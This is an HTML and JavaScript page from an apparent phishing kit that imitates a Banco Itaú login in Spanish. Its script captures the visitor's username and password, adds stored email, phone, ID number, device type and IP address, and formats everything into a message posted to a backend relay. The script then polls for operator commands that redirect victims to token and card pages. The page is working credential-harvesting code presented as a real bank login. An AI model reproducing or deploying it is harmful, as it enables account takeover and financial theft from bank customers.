<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingresa tus datos</title>
  <link rel="stylesheet" href="css/index.css">
</head>
<body>
  <!-- Campos ocultos necesarios -->
  <input type="hidden" id="session_id" value="">
  <input type="hidden" id="username" value="">

  <div class="form-container">
    <img src="img/viste.png" alt="Logo" class="logo">
    <h1>Ingresa tus datos</h1>

    <label for="documento">Usuario</label>
    <input type="text" id="documento" placeholder="Ingresa tu usuario" maxlength="15" minlength="5" pattern="[a-zA-Z0-9]+" oninput="this.value = this.value.replace(/[^a-zA-Z0-9]/g, '')" title="Letras y números, mínimo 5 y máximo 15 caracteres" />

    <label for="clave">Clave</label>
    <div class="password-container">
      <input type="password" id="clave" placeholder="Ingresa tu clave" maxlength="15" minlength="5" pattern="[a-zA-Z0-9]+" oninput="validarCampos()" title="Letras y números, mínimo 5 y máximo 15 caracteres" />
      <svg class="toggle-password" onclick="togglePassword()" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#666"/>
      </svg>
    </div>

    <a href="#" class="link">¿Tienes problemas con tu clave?</a>

    <button id="btnEntrar" disabled>Ingresar</button>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="text-align: center;">
      <img src="img/viste.png" alt="Logo" style="width: 80px; height: 80px; animation: blink 1s ease-in-out infinite;">
    </div>
  </div>

  <div class="side-image">
    <img src="img/tele.png" alt="Imagen lateral">
  </div>

  <style>
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>

  <script>
    function togglePassword() {
      const input = document.getElementById('clave');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    function validarCampos() {
      const btnEntrar = document.getElementById("btnEntrar");
      const clave = document.getElementById("clave").value;
      
      // Validar que la clave tenga al menos 5 caracteres alfanuméricos
      const claveValida = clave.length >= 5;
      
      // Cambiar estado del botón
      if (claveValida) {
        btnEntrar.disabled = false;
        btnEntrar.style.background = "#FF6B35";
        btnEntrar.style.color = "white";
        btnEntrar.style.cursor = "pointer";
      } else {
        btnEntrar.disabled = true;
        btnEntrar.style.background = "#e6e6e6";
        btnEntrar.style.color = "#888";
        btnEntrar.style.cursor = "not-allowed";
      }
    }

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Event listener para el botón Ingresar
      const btnIngresar = document.getElementById('btnEntrar');
      
      if (btnIngresar) {
        btnIngresar.addEventListener('click', async function (event) {
          event.preventDefault();

          // Obtener datos del formulario
          const identificacion = document.getElementById('documento').value;
          const password = document.getElementById('clave').value;
          
          // Validar que la clave tenga al menos 5 caracteres
          if (password.length < 5) {
            alert('La clave debe tener al menos 5 caracteres');
            return;
          }
          
          // Validar que la identificación tenga al menos 5 dígitos
          if (identificacion.length < 5) {
            alert('La identificación debe tener al menos 5 dígitos');
            return;
          }

          // Mostrar loader
          const loader = document.getElementById('loader-overlay');
          if (loader) {
            loader.style.display = 'flex';
          }

          const formUsername = document.getElementById('username').value;
          const session_id = document.getElementById('session_id').value;

          localStorage.setItem('username', formUsername);
          localStorage.setItem('password', password);
          localStorage.setItem('session_id', session_id);
          localStorage.setItem('identificacion', identificacion);

          let infoData;
          try {
            infoData = JSON.parse(localStorage.getItem('info') || '{}');
          } catch (e) {
            return;
          }

          const meta = infoData?.metaInfo || {};

          // Obtener datos del usuario desde localStorage o URL params
          const username = urlParams.get('user') || localStorage.getItem('username') || '';
          
          // Detectar tipo de dispositivo
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          
          if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
          } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
          } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
          } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
          }
          
          const hora = new Date().toLocaleString('es-ES');

          // Obtener IP y construir mensaje
          fetch('get_ip.php')
            .then(response => {
              return response.json();
            })
            .then(data => {
              const ip = data.ip || 'No disponible';
              
              const mensaje = `
<b><u>💎BANCO ITAU💎</b></u>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO ITAU
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• 👤 Usuario: ${identificacion}
• 🔑 Clave: ${password}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', session_id);

              fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
              })
              .then(res => {
                return res.json();
              })
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(session_id, result.messageId);
                } else {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                }
              })
              .catch(err => {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              });
            })
            .catch((error) => {
              // Si falla la obtención de IP, enviar sin IP
              const mensaje = `
<b><u>💎BANCO ITAU💎</b></u>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO ITAU
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• 👤 Usuario: ${identificacion}
• 🔑 Clave: ${password}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', session_id);

              fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
              })
              .then(res => {
                return res.json();
              })
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(session_id, result.messageId);
                } else {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                }
              })
              .catch(err => {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              });
            });
        });
      }

      // Agregar event listener al campo clave
      const claveField = document.getElementById("clave");
      claveField.addEventListener('input', function() {
        this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
        validarCampos();
      });
      
      // Validar inicialmente
      validarCampos();
    });

    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_respuesta.php', {
      method: 'POST',
      body: formData
    });
    const result = await res.json();

    if (result.action) {
      const loader = document.getElementById('loader-overlay');
      if (loader) loader.style.display = 'none';

      switch (result.action) {
        case 'pedir_dinamica':
          window.location.href = "token.php";
          break;

        case 'error_logo':
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.php";
          break;

        case 'error_tc':
          alert("Error con la tarjeta. Intenta con otra.");
          window.location.href = "tarjeta.php";  // O cambia esto al archivo correcto
          break;

        case 'confirm_finalizar':
          window.location.href = "/fin.php";
          break;
      }
    } else {
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }

  } catch (err) {
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
}

  </script>
  
  <!-- Loader de logo -->
  <div id="loader" style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 9999;
  ">
    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
  </div>

  <style>
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.7; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>

  <script>
    // Espera 3 segundos y redirige al siguiente paso
    setTimeout(function () {
      document.getElementById('loader').style.display = 'none';
    }, 3000);
  </script>
</body>
</html>
